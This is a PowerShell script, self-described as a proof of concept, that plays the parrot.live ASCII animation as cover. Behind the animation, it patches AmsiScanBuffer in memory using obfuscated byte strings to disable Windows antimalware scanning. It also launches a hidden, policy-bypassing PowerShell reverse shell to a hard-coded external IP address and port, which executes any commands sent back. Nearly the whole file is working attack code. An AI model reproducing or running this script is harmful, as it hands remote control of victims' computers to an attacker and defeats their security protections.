Add-Type -AssemblyName PresentationFramework
$Title="test"
$Message="this is a poc"

$request = [System.Net.HttpWebRequest]::Create("http://parrot.live");
$response = $request.GetResponse();
$receiveStream = $response.GetResponseStream();
$readStream = [System.IO.StreamReader]::new($receiveStream);

$c = ‘t’
$Win32 = @”
using System.Runtime.InteropServices;
using System;
public class Win32 {
[DllImport(“kernel32”)]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport(“kernel32”)]
public static extern IntPtr LoadLibrary(string name);
[DllImport(“kernel32”)]
public static extern bool VirtualProtec$c(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
“@
Add-Type $Win32
$nowhere = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
$LoadLibrary = [Win32]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($nowhere))
$somewhere = [Byte[]] (0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
$notaddress = [Win32]::GetProcAddress($LoadLibrary, [System.Text.Encoding]::ASCII.GetString($somewhere))
$notp = 0
$replace = ‘VirtualProtec’
[Win32]::(‘{0}{1}’ -f $replace,$c)($notaddress, [uint32]5, 0x40, [ref]$notp)
$stopitplease = [Byte[]] (0xB8, 0x57, 0x00, 0x17, 0x20, 0x35, 0x8A, 0x53, 0x34, 0x1D, 0x05, 0x7A, 0xAC, 0xE3, 0x42, 0xC3)
$marshalClass = [System.Runtime.InteropServices.Marshal]
$marshalClass::Copy($stopitplease, 0, $notaddress, $stopitplease.Length)

powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('162.210.192.209', 47687);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"

[console]::TreatControlCAsInput = $true;
$initialForegroundColor = [Console]::ForegroundColor;
while ($line = $readStream.ReadLine()) {
  if ([Console]::KeyAvailable) {
    $key = [System.Console]::ReadKey($true)
    if (($key.modifiers -band [ConsoleModifiers]"control") -and ($key.key -eq "C"))
    {
      break;
    }
  }

  [Console]::WriteLine($line);
}

$readStream.Close();
$receiveStream.Close();
$request.Abort();
[console]::TreatControlCAsInput = $false;
[Console]::ForegroundColor = $initialForegroundColor;
